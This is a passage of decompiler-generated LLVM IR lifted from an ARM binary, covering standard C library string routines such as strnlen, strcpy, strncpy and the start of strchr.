  %v9_15ad0 = icmp eq i8 %v3_15acc, %v3_15a74
  br i1 %v9_15ad0, label %dec_label_pc_15aec, label %dec_label_pc_15ad8

dec_label_pc_15ad8:                               ; preds = %dec_label_pc_15acc
  %v2_15ad8 = icmp eq i8 %v3_15acc, 0
  br i1 %v2_15ad8, label %dec_label_pc_15b60, label %dec_label_pc_15ae0

dec_label_pc_15ae0:                               ; preds = %dec_label_pc_15ad8
  %v1_15ae0 = add i32 %v0_15acc, 2
  %v2_15ae0 = inttoptr i32 %v1_15ae0 to i8*
  %v3_15ae0 = load i8, i8* %v2_15ae0, align 1
  store i32 %v1_15ae0, i32* %r0.global-to-local, align 4
  %v9_15ae4 = icmp eq i8 %v3_15ae0, %v3_15a74
  br i1 %v9_15ae4, label %dec_label_pc_15aec, label %dec_label_pc_15ac4

dec_label_pc_15aec:                               ; preds = %dec_label_pc_15acc, %dec_label_pc_15ae0, %dec_label_pc_15ae4.preheader
  %v0_15aec = phi i32 [ %storemerge41, %dec_label_pc_15ae4.preheader ], [ %v1_15acc, %dec_label_pc_15acc ], [ %v1_15ae0, %dec_label_pc_15ae0 ]
  %v1_15aec = add i32 %v0_15aec, 1
  br label %dec_label_pc_15af4

dec_label_pc_15af4:                               ; preds = %dec_label_pc_15aa8, %dec_label_pc_15aec
  %storemerge41 = phi i32 [ %v1_15aec, %dec_label_pc_15aec ], [ %v1_15aa8, %dec_label_pc_15aa8 ]
  %v3_15aec.pn.in = inttoptr i32 %storemerge41 to i8*
  %v3_15aec.pn = load i8, i8* %v3_15aec.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  %storemerge = icmp eq i8 %v3_15aec.pn, %v4_15a98
  br i1 %storemerge, label %dec_label_pc_15af8, label %dec_label_pc_15ae4.preheader

dec_label_pc_15af8:                               ; preds = %dec_label_pc_15af4
  %v1_15af8 = add i32 %storemerge41, 1
  %v2_15af8 = inttoptr i32 %v1_15af8 to i8*
  %v3_15af8 = load i8, i8* %v2_15af8, align 1
  %v4_15af8 = zext i8 %v3_15af8 to i32
  %v3_15afc = load i8, i8* %v2_15afc, align 1
  %v4_15afc = zext i8 %v3_15afc to i32
  %v9_15b04 = icmp eq i8 %v3_15af8, %v3_15afc
  %v1_15b0c = add i32 %storemerge41, -1
  store i32 %v1_15b0c, i32* %r0.global-to-local, align 4
  br i1 %v9_15b04, label %dec_label_pc_15b14, label %dec_label_pc_15b54

dec_label_pc_15b14:                               ; preds = %dec_label_pc_15af8, %dec_label_pc_15b44
  %v0_15b2c = phi i32 [ %v1_15b34, %dec_label_pc_15b44 ], [ %v1_15afc, %dec_label_pc_15af8 ]
  %v0_15b24 = phi i32 [ %v1_15b30, %dec_label_pc_15b44 ], [ %v1_15af8, %dec_label_pc_15af8 ]
  %v0_15b14 = phi i32 [ %v4_15b44, %dec_label_pc_15b44 ], [ %v4_15af8, %dec_label_pc_15af8 ]
  %v2_15b14 = icmp eq i32 %v0_15b14, 0
  br i1 %v2_15b14, label %dec_label_pc_15b64, label %dec_label_pc_15b1c

dec_label_pc_15b1c:                               ; preds = %dec_label_pc_15b14
  %v1_15b1c = add i32 %v0_15b24, 1
  %v2_15b1c = inttoptr i32 %v1_15b1c to i8*
  %v3_15b1c = load i8, i8* %v2_15b1c, align 1
  %v1_15b20 = add i32 %v0_15b2c, 1
  %v2_15b20 = inttoptr i32 %v1_15b20 to i8*
  %v3_15b20 = load i8, i8* %v2_15b20, align 1
  %v4_15b20 = zext i8 %v3_15b20 to i32
  %v9_15b28 = icmp eq i8 %v3_15b1c, %v3_15b20
  %v1_15b30 = add i32 %v0_15b24, 2
  %v1_15b34 = add i32 %v0_15b2c, 2
  br i1 %v9_15b28, label %dec_label_pc_15b3c, label %dec_label_pc_15b54

dec_label_pc_15b3c:                               ; preds = %dec_label_pc_15b1c
  %v2_15b3c = icmp eq i8 %v3_15b1c, 0
  br i1 %v2_15b3c, label %dec_label_pc_15b64, label %dec_label_pc_15b44

dec_label_pc_15b44:                               ; preds = %dec_label_pc_15b3c
  %v2_15b44 = inttoptr i32 %v1_15b34 to i8*
  %v3_15b44 = load i8, i8* %v2_15b44, align 1
  %v4_15b44 = zext i8 %v3_15b44 to i32
  %v2_15b48 = inttoptr i32 %v1_15b30 to i8*
  %v3_15b48 = load i8, i8* %v2_15b48, align 1
  %v9_15b4c = icmp eq i8 %v3_15b48, %v3_15b44
  br i1 %v9_15b4c, label %dec_label_pc_15b14, label %dec_label_pc_15b54

dec_label_pc_15b54:                               ; preds = %dec_label_pc_15b44, %dec_label_pc_15b1c, %dec_label_pc_15af8
  %v0_15b54 = phi i32 [ %v4_15afc, %dec_label_pc_15af8 ], [ %v4_15b44, %dec_label_pc_15b44 ], [ %v4_15b20, %dec_label_pc_15b1c ]
  %v2_15b54 = icmp eq i32 %v0_15b54, 0
  br i1 %v2_15b54, label %dec_label_pc_15b64, label %dec_label_pc_15ab8

dec_label_pc_15b60:                               ; preds = %dec_label_pc_15a84, %dec_label_pc_15ad8, %dec_label_pc_15ac4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15b64

dec_label_pc_15b64:                               ; preds = %dec_label_pc_15b54, %dec_label_pc_15b3c, %dec_label_pc_15b14, %entry, %dec_label_pc_15a98, %dec_label_pc_15b60
  %v1_15b68 = phi i32 [ %v1_15a84, %dec_label_pc_15a98 ], [ 0, %dec_label_pc_15b60 ], [ %v1_15b68.pre, %entry ], [ %v1_15b0c, %dec_label_pc_15b14 ], [ %v1_15b0c, %dec_label_pc_15b3c ], [ %v1_15b0c, %dec_label_pc_15b54 ]
  ret i32 %v1_15b68

; uselistorder directives
  uselistorder i32 %v1_15b30, { 1, 0 }
  uselistorder i8 %v3_15aec.pn, { 1, 0 }
  uselistorder i8* %v3_15aec.pn.in, { 1, 0 }
  uselistorder i32 %storemerge41, { 3, 2, 6, 1, 4, 0, 5 }
  uselistorder i8 %v3_15ae0, { 1, 0 }
  uselistorder i32 %v1_15ae0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_15a84, { 0, 2, 3, 1 }
  uselistorder i8 %v3_15a74, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 2, 6, 7, 4, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_15b64, { 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_15b60, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15b14, { 1, 0 }
  uselistorder label %dec_label_pc_15af4, { 1, 0 }
  uselistorder label %dec_label_pc_15aec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15ac4, { 1, 0 }
  uselistorder label %dec_label_pc_15ae4.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_15b6c = icmp eq i32 %arg2, 0
  br i1 %v2_15b6c, label %bb, label %dec_label_pc_15b80

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_15b80:                               ; preds = %entry
  %v2_15b80 = add i32 %tmp, %arg2
  %v3_15b80 = icmp ult i32 %v2_15b80, %tmp
  br i1 %v3_15b80, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_15b80
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_15b80, %bb19
  %v5_15c20 = phi i32 [ %v2_15b80, %dec_label_pc_15b80 ], [ -1, %bb19 ]
  %v1_15ba04 = urem i32 %tmp, 4
  %v2_15ba05 = icmp eq i32 %v1_15ba04, 0
  br i1 %v2_15ba05, label %dec_label_pc_15ba8, label %dec_label_pc_15b90

dec_label_pc_15b90:                               ; preds = %bb20, %dec_label_pc_15b9c
  %v0_15b9c = phi i32 [ %v1_15b9c, %dec_label_pc_15b9c ], [ %tmp, %bb20 ]
  %v1_15b90 = inttoptr i32 %v0_15b9c to i8*
  %v2_15b90 = load i8, i8* %v1_15b90, align 1
  %v2_15b94 = icmp eq i8 %v2_15b90, 0
  br i1 %v2_15b94, label %dec_label_pc_15c1c, label %dec_label_pc_15b9c

dec_label_pc_15b9c:                               ; preds = %dec_label_pc_15b90
  %v1_15b9c = add i32 %v0_15b9c, 1
  %v1_15ba0 = urem i32 %v1_15b9c, 4
  %v2_15ba0 = icmp eq i32 %v1_15ba0, 0
  br i1 %v2_15ba0, label %dec_label_pc_15ba8, label %dec_label_pc_15b90

dec_label_pc_15ba8:                               ; preds = %dec_label_pc_15b9c, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_15b9c, %dec_label_pc_15b9c ]
  %v3_15c0c30 = icmp ult i32 %storemerge.lcssa, %v5_15c20
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_15c0c30, label %dec_label_pc_15bb0, label %dec_label_pc_15c1c

dec_label_pc_15bb0:                               ; preds = %dec_label_pc_15c08, %dec_label_pc_15ba8
  %v0_15c0037 = phi i32 [ %v4_15bb0, %dec_label_pc_15c08 ], [ %storemerge.lcssa, %dec_label_pc_15ba8 ]
  %v1_15bb0 = inttoptr i32 %v0_15c0037 to i32*
  %v2_15bb0 = load i32, i32* %v1_15bb0, align 4
  %v4_15bb0 = add i32 %v0_15c0037, 4
  %v2_15bb4 = add i32 %v2_15bb0, -16843009
  %v2_15bb8 = and i32 %v2_15bb4, -2139062144
  store i32 %v2_15bb8, i32* @ip, align 4
  %v2_15bbc = icmp eq i32 %v2_15bb8, 0
  br i1 %v2_15bbc, label %dec_label_pc_15c08, label %dec_label_pc_15bc4

dec_label_pc_15bc4:                               ; preds = %dec_label_pc_15bb0
  %v2_15bc4 = inttoptr i32 %v0_15c0037 to i8*
  %v3_15bc4 = load i8, i8* %v2_15bc4, align 1
  %v2_15bc8 = icmp eq i8 %v3_15bc4, 0
  br i1 %v2_15bc8, label %bb21, label %dec_label_pc_15bd8

bb21:                                             ; preds = %dec_label_pc_15bc4
  br label %dec_label_pc_15c1c

dec_label_pc_15bd8:                               ; preds = %dec_label_pc_15bc4
  %v1_15bd8 = add i32 %v0_15c0037, 1
  %v2_15bd8 = inttoptr i32 %v1_15bd8 to i8*
  %v3_15bd8 = load i8, i8* %v2_15bd8, align 1
  %v2_15bdc = icmp eq i8 %v3_15bd8, 0
  br i1 %v2_15bdc, label %dec_label_pc_15c1c, label %dec_label_pc_15be8

dec_label_pc_15be8:                               ; preds = %dec_label_pc_15bd8
  %v1_15be8 = add i32 %v0_15c0037, 2
  %v2_15be8 = inttoptr i32 %v1_15be8 to i8*
  %v3_15be8 = load i8, i8* %v2_15be8, align 1
  %v2_15bec = icmp eq i8 %v3_15be8, 0
  br i1 %v2_15bec, label %dec_label_pc_15c1c, label %dec_label_pc_15bf8

dec_label_pc_15bf8:                               ; preds = %dec_label_pc_15be8
  %v1_15bf8 = add i32 %v0_15c0037, 3
  %v2_15bf8 = inttoptr i32 %v1_15bf8 to i8*
  %v3_15bf8 = load i8, i8* %v2_15bf8, align 1
  %v2_15bfc = icmp eq i8 %v3_15bf8, 0
  br i1 %v2_15bfc, label %dec_label_pc_15c1c, label %dec_label_pc_15c08

dec_label_pc_15c08:                               ; preds = %dec_label_pc_15bf8, %dec_label_pc_15bb0
  %v3_15c0c = icmp ult i32 %v4_15bb0, %v5_15c20
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_15c0c, label %dec_label_pc_15bb0, label %dec_label_pc_15c1c

dec_label_pc_15c1c:                               ; preds = %dec_label_pc_15c08, %dec_label_pc_15ba8, %dec_label_pc_15b90, %dec_label_pc_15bd8, %dec_label_pc_15be8, %dec_label_pc_15bf8, %bb21
  %v1_15c1c = phi i32 [ %v0_15c0037, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_15ba8 ], [ %v1_15bd8, %dec_label_pc_15bd8 ], [ %v1_15be8, %dec_label_pc_15be8 ], [ %v1_15bf8, %dec_label_pc_15bf8 ], [ %v5_15c20, %dec_label_pc_15c08 ], [ %v0_15b9c, %dec_label_pc_15b90 ]
  %v3_15c1c = icmp uge i32 %v5_15c20, %v1_15c1c
  %v9_15c1c = icmp eq i32 %v5_15c20, %v1_15c1c
  %v2_15c20 = xor i1 %v3_15c1c, true
  %v3_15c20 = or i1 %v9_15c1c, %v2_15c20
  br i1 %v3_15c20, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_15c1c
  %v6_15c20 = sub i32 %v5_15c20, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_15c1c, %bb22
  %v5_15c24 = phi i32 [ %v1_15c1c, %dec_label_pc_15c1c ], [ %v6_15c20, %bb22 ]
  %v2_15c24 = xor i1 %v9_15c1c, true
  %v3_15c24 = and i1 %v3_15c1c, %v2_15c24
  br i1 %v3_15c24, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_15c24 = sub i32 %v5_15c24, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_15c2c = phi i32 [ 0, %bb ], [ %v5_15c24, %bb23 ], [ %v6_15c24, %bb24 ]
  ret i32 %v1_15c2c

; uselistorder directives
  uselistorder i1 %v3_15c1c, { 1, 0 }
  uselistorder i32 %v4_15bb0, { 1, 0 }
  uselistorder i32 %v0_15c0037, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_15b9c, { 1, 0, 2 }
  uselistorder i32 %v5_15c20, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_15c1c, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_15b90, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_15c481 = load i32, i32* @r1, align 4
  %v1_15c482 = inttoptr i32 %v0_15c481 to i8*
  %v2_15c483 = load i8, i8* %v1_15c482, align 1
  %v2_15c4c5 = icmp eq i8 %v2_15c483, 0
  store i1 %v2_15c4c5, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_15c483, i8* %arg1, align 1
  br i1 %v2_15c4c5, label %dec_label_pc_15c58, label %dec_label_pc_15c40

dec_label_pc_15c40:                               ; preds = %entry, %dec_label_pc_15c40
  %v0_15c40 = load i32, i32* @r1, align 4
  %v1_15c40 = add i32 %v0_15c40, 1
  store i32 %v1_15c40, i32* @r1, align 4
  %v0_15c44 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c44 = add i32 %v0_15c44, 1
  store i32 %v1_15c44, i32* %r2.global-to-local, align 4
  %v1_15c48 = inttoptr i32 %v1_15c40 to i8*
  %v2_15c48 = load i8, i8* %v1_15c48, align 1
  %v2_15c4c = icmp eq i8 %v2_15c48, 0
  store i1 %v2_15c4c, i1* %cpsr_z.global-to-local, align 1
  %v3_15c50 = inttoptr i32 %v1_15c44 to i8*
  store i8 %v2_15c48, i8* %v3_15c50, align 1
  %v0_15c54 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15c54, label %dec_label_pc_15c58, label %dec_label_pc_15c40

dec_label_pc_15c58:                               ; preds = %dec_label_pc_15c40, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15c40, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_15c5c = icmp eq i32 %arg2, 3
  store i1 %v7_15c5c, i1* %cpsr_z.global-to-local, align 1
  %v0_15c60 = load i32, i32* @lr, align 4
  store i32 %v0_15c60, i32* %stack_var_-4, align 4
  %v1_15c64 = add i32 %arg1, -1
  store i32 %v1_15c64, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_15ce0, label %dec_label_pc_15c6c

dec_label_pc_15c6c:                               ; preds = %entry
  %v3_15c6c = udiv i32 %arg2, 4
  store i32 %v3_15c6c, i32* %lr.global-to-local, align 4
  %v0_15c70.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15c70

dec_label_pc_15c70:                               ; preds = %dec_label_pc_15cbc, %dec_label_pc_15c6c
  %v2_15c78 = phi i32 [ %v6_15cb0, %dec_label_pc_15cbc ], [ %v1_15c64, %dec_label_pc_15c6c ]
  %v0_15c70 = phi i32 [ %v1_15cc0, %dec_label_pc_15cbc ], [ %v0_15c70.pre, %dec_label_pc_15c6c ]
  %v1_15c70 = inttoptr i32 %v0_15c70 to i8*
  %v2_15c70 = load i8, i8* %v1_15c70, align 1
  %v3_15c70 = zext i8 %v2_15c70 to i32
  store i32 %v3_15c70, i32* %r3.global-to-local, align 4
  %v2_15c74 = icmp eq i8 %v2_15c70, 0
  store i1 %v2_15c74, i1* %cpsr_z.global-to-local, align 1
  %v3_15c78 = add i32 %v2_15c78, 1
  %v4_15c78 = inttoptr i32 %v3_15c78 to i8*
  store i8 %v2_15c70, i8* %v4_15c78, align 1
  %v5_15c78 = load i32, i32* @ip, align 4
  %v6_15c78 = add i32 %v5_15c78, 1
  store i32 %v6_15c78, i32* @ip, align 4
  %v0_15c7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15c7c, label %dec_label_pc_15ccc, label %dec_label_pc_15c80

dec_label_pc_15c80:                               ; preds = %dec_label_pc_15c70
  %v0_15c80 = load i32, i32* @r1, align 4
  %v1_15c80 = add i32 %v0_15c80, 1
  %v2_15c80 = inttoptr i32 %v1_15c80 to i8*
  %v3_15c80 = load i8, i8* %v2_15c80, align 1
  %v4_15c80 = zext i8 %v3_15c80 to i32
  store i32 %v4_15c80, i32* %r3.global-to-local, align 4
  %v2_15c84 = icmp eq i8 %v3_15c80, 0
  store i1 %v2_15c84, i1* %cpsr_z.global-to-local, align 1
  %v3_15c88 = add i32 %v5_15c78, 2
  %v4_15c88 = inttoptr i32 %v3_15c88 to i8*
  store i8 %v3_15c80, i8* %v4_15c88, align 1
  %v5_15c88 = load i32, i32* @ip, align 4
  %v6_15c88 = add i32 %v5_15c88, 1
  store i32 %v6_15c88, i32* @ip, align 4
  %v0_15c8c = load i32, i32* @r1, align 4
  %v1_15c8c = add i32 %v0_15c8c, 1
  store i32 %v1_15c8c, i32* %r1.global-to-local, align 4
  %v0_15c90 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15c90, label %dec_label_pc_15ccc, label %dec_label_pc_15c94

dec_label_pc_15c94:                               ; preds = %dec_label_pc_15c80
  %v1_15c94 = add i32 %v0_15c8c, 2
  %v2_15c94 = inttoptr i32 %v1_15c94 to i8*
  %v3_15c94 = load i8, i8* %v2_15c94, align 1
  %v4_15c94 = zext i8 %v3_15c94 to i32
  store i32 %v4_15c94, i32* %r3.global-to-local, align 4
  %v2_15c98 = icmp eq i8 %v3_15c94, 0
  store i1 %v2_15c98, i1* %cpsr_z.global-to-local, align 1
  %v3_15c9c = add i32 %v5_15c88, 2
  %v4_15c9c = inttoptr i32 %v3_15c9c to i8*
  store i8 %v3_15c94, i8* %v4_15c9c, align 1
  %v5_15c9c = load i32, i32* @ip, align 4
  %v6_15c9c = add i32 %v5_15c9c, 1
  store i32 %v6_15c9c, i32* @ip, align 4
  %v0_15ca0 = load i32, i32* %r1.global-to-local, align 4
  %v1_15ca0 = add i32 %v0_15ca0, 1
  store i32 %v1_15ca0, i32* %r1.global-to-local, align 4
  %v0_15ca4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15ca4, label %dec_label_pc_15ccc, label %dec_label_pc_15ca8

dec_label_pc_15ca8:                               ; preds = %dec_label_pc_15c94
  %v1_15ca8 = add i32 %v0_15ca0, 2
  %v2_15ca8 = inttoptr i32 %v1_15ca8 to i8*
  %v3_15ca8 = load i8, i8* %v2_15ca8, align 1
  %v4_15ca8 = zext i8 %v3_15ca8 to i32
  store i32 %v4_15ca8, i32* %r3.global-to-local, align 4
  %v2_15cac = icmp eq i8 %v3_15ca8, 0
  store i1 %v2_15cac, i1* %cpsr_z.global-to-local, align 1
  %v3_15cb0 = add i32 %v5_15c9c, 2
  %v4_15cb0 = inttoptr i32 %v3_15cb0 to i8*
  store i8 %v3_15ca8, i8* %v4_15cb0, align 1
  %v5_15cb0 = load i32, i32* @ip, align 4
  %v6_15cb0 = add i32 %v5_15cb0, 1
  store i32 %v6_15cb0, i32* @ip, align 4
  %v0_15cb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_15cb4 = add i32 %v0_15cb4, 1
  store i32 %v1_15cb4, i32* %r1.global-to-local, align 4
  %v0_15cb8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15cb8, label %dec_label_pc_15ccc, label %dec_label_pc_15cbc

dec_label_pc_15cbc:                               ; preds = %dec_label_pc_15ca8
  %v0_15cbc = load i32, i32* %lr.global-to-local, align 4
  %v1_15cbc = add i32 %v0_15cbc, -1
  store i32 %v1_15cbc, i32* %lr.global-to-local, align 4
  %v7_15cbc = icmp eq i32 %v0_15cbc, 1
  store i1 %v7_15cbc, i1* %cpsr_z.global-to-local, align 1
  %v1_15cc0 = add i32 %v0_15cb4, 2
  store i32 %v1_15cc0, i32* @r1, align 4
  br i1 %v7_15cbc, label %dec_label_pc_15ce0, label %dec_label_pc_15c70

dec_label_pc_15ccc:                               ; preds = %dec_label_pc_15ca8, %dec_label_pc_15c94, %dec_label_pc_15c80, %dec_label_pc_15c70
  %v1_15ccc = phi i32 [ %v6_15cb0, %dec_label_pc_15ca8 ], [ %v6_15c9c, %dec_label_pc_15c94 ], [ %v6_15c88, %dec_label_pc_15c80 ], [ %v6_15c78, %dec_label_pc_15c70 ]
  %v2_15ccc1 = sub i32 %arg1, %v1_15ccc
  %v2_15cd0 = add i32 %v2_15ccc1, %arg2
  %v1_15cd4 = add i32 %v2_15cd0, -1
  store i32 %v1_15cd4, i32* %r3.global-to-local, align 4
  %v7_15cd4 = icmp eq i32 %v2_15cd0, 1
  store i1 %v7_15cd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15cd4, label %dec_label_pc_15d10, label %dec_label_pc_15d00

dec_label_pc_15ce0:                               ; preds = %dec_label_pc_15cbc, %entry
  %v2_15cf07 = phi i32 [ %v1_15c64, %entry ], [ %v6_15cb0, %dec_label_pc_15cbc ]
  %v1_15ce0 = urem i32 %arg2, 4
  store i32 %v1_15ce0, i32* %r3.global-to-local, align 4
  %v2_15ce0 = icmp eq i32 %v1_15ce0, 0
  store i1 %v2_15ce0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ce0, label %dec_label_pc_15d10, label %dec_label_pc_15ce8

dec_label_pc_15ce8:                               ; preds = %dec_label_pc_15ce0, %dec_label_pc_15cf8.dec_label_pc_15ce8_crit_edge
  %v2_15cf0 = phi i32 [ %v6_15cf0, %dec_label_pc_15cf8.dec_label_pc_15ce8_crit_edge ], [ %v2_15cf07, %dec_label_pc_15ce0 ]
  %v0_15cec = phi i32 [ %v0_15cec.pre, %dec_label_pc_15cf8.dec_label_pc_15ce8_crit_edge ], [ %v1_15ce0, %dec_label_pc_15ce0 ]
  %v0_15ce8 = load i32, i32* @r1, align 4
  %v1_15ce8 = inttoptr i32 %v0_15ce8 to i8*
  %v2_15ce8 = load i8, i8* %v1_15ce8, align 1
  %v3_15ce8 = zext i8 %v2_15ce8 to i32
  store i32 %v3_15ce8, i32* %r2.global-to-local, align 4
  %v5_15ce8 = add i32 %v0_15ce8, 1
  store i32 %v5_15ce8, i32* @r1, align 4
  %v1_15cec = add i32 %v0_15cec, -1
  store i32 %v1_15cec, i32* %r3.global-to-local, align 4
  %v7_15cec = icmp eq i32 %v0_15cec, 1
  store i1 %v7_15cec, i1* %cpsr_z.global-to-local, align 1
  %v3_15cf0 = add i32 %v2_15cf0, 1
  %v4_15cf0 = inttoptr i32 %v3_15cf0 to i8*
  store i8 %v2_15ce8, i8* %v4_15cf0, align 1
  %v5_15cf0 = load i32, i32* @ip, align 4
  %v6_15cf0 = add i32 %v5_15cf0, 1
  store i32 %v6_15cf0, i32* @ip, align 4
  %v0_15cf4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15cf4, label %dec_label_pc_15d10, label %dec_label_pc_15cf8

dec_label_pc_15cf8:                               ; preds = %dec_label_pc_15ce8
  %v0_15cf8 = load i32, i32* %r2.global-to-local, align 4
  %v2_15cf8 = icmp eq i32 %v0_15cf8, 0
  store i1 %v2_15cf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cf8, label %dec_label_pc_15d00, label %dec_label_pc_15cf8.dec_label_pc_15ce8_crit_edge

dec_label_pc_15cf8.dec_label_pc_15ce8_crit_edge:  ; preds = %dec_label_pc_15cf8
  %v0_15cec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15ce8

dec_label_pc_15d00:                               ; preds = %dec_label_pc_15cf8, %dec_label_pc_15ccc
  %v2_15d0810 = phi i32 [ %v1_15ccc, %dec_label_pc_15ccc ], [ %v6_15cf0, %dec_label_pc_15cf8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15d04

dec_label_pc_15d04:                               ; preds = %dec_label_pc_15d04.dec_label_pc_15d04_crit_edge, %dec_label_pc_15d00
  %v2_15d08 = phi i32 [ %v6_15d08, %dec_label_pc_15d04.dec_label_pc_15d04_crit_edge ], [ %v2_15d0810, %dec_label_pc_15d00 ]
  %v0_15d08.off0 = phi i8 [ %extract.t, %dec_label_pc_15d04.dec_label_pc_15d04_crit_edge ], [ 0, %dec_label_pc_15d00 ]
  %v0_15d04 = load i32, i32* %r3.global-to-local, align 4
  %v1_15d04 = add i32 %v0_15d04, -1
  store i32 %v1_15d04, i32* %r3.global-to-local, align 4
  %v7_15d04 = icmp eq i32 %v0_15d04, 1
  store i1 %v7_15d04, i1* %cpsr_z.global-to-local, align 1
  %v3_15d08 = add i32 %v2_15d08, 1
  %v4_15d08 = inttoptr i32 %v3_15d08 to i8*
  store i8 %v0_15d08.off0, i8* %v4_15d08, align 1
  %v5_15d08 = load i32, i32* @ip, align 4
  %v6_15d08 = add i32 %v5_15d08, 1
  store i32 %v6_15d08, i32* @ip, align 4
  %v0_15d0c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15d0c, label %dec_label_pc_15d10, label %dec_label_pc_15d04.dec_label_pc_15d04_crit_edge

dec_label_pc_15d04.dec_label_pc_15d04_crit_edge:  ; preds = %dec_label_pc_15d04
  %v0_15d08.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_15d08.pre to i8
  br label %dec_label_pc_15d04

dec_label_pc_15d10:                               ; preds = %dec_label_pc_15ce8, %dec_label_pc_15d04, %dec_label_pc_15ccc, %dec_label_pc_15ce0
  %v2_15d10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_15d10, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_15d08, { 1, 0 }
  uselistorder i32 %v0_15d04, { 1, 0 }
  uselistorder i32 %v6_15cf0, { 0, 2, 1 }
  uselistorder i32 %v1_15ce0, { 2, 1, 0 }
  uselistorder i32 %v2_15cd0, { 1, 0 }
  uselistorder i32 %v1_15cc0, { 1, 0 }
  uselistorder i32 %v0_15cbc, { 1, 0 }
  uselistorder i32 %v6_15cb0, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15d10, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_15ce8, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_15d1c = urem i32 %arg1, 256
  %v0_15d3c3 = load i32, i32* @r0, align 4
  %v1_15d3c4 = urem i32 %v0_15d3c3, 4
  %v2_15d3c5 = icmp eq i32 %v1_15d3c4, 0
  br i1 %v2_15d3c5, label %dec_label_pc_15d44, label %dec_label_pc_15d24

dec_label_pc_15d24:                               ; preds = %entry, %dec_label_pc_15d38
  %v0_15d38 = phi i32 [ %v1_15d38, %dec_label_pc_15d38 ], [ %v0_15d3c3, %entry ]
  %v1_15d24 = inttoptr i32 %v0_15d38 to i8*
  %v2_15d24 = load i8, i8* %v1_15d24, align 1
  %v3_15d24 = zext i8 %v2_15d24 to i32
  store i32 %v3_15d24, i32* @r3, align 4
  %v9_15d28 = icmp eq i32 %v3_15d24, %v1_15d1c
  br i1 %v9_15d28, label %dec_label_pc_15df8, label %dec_label_pc_15d30

dec_label_pc_15d30:                               ; preds = %dec_label_pc_15d24
  %v2_15d30 = icmp eq i8 %v2_15d24, 0
  br i1 %v2_15d30, label %dec_label_pc_15df4, label %dec_label_pc_15d38

dec_label_pc_15d38:                               ; preds = %dec_label_pc_15d30
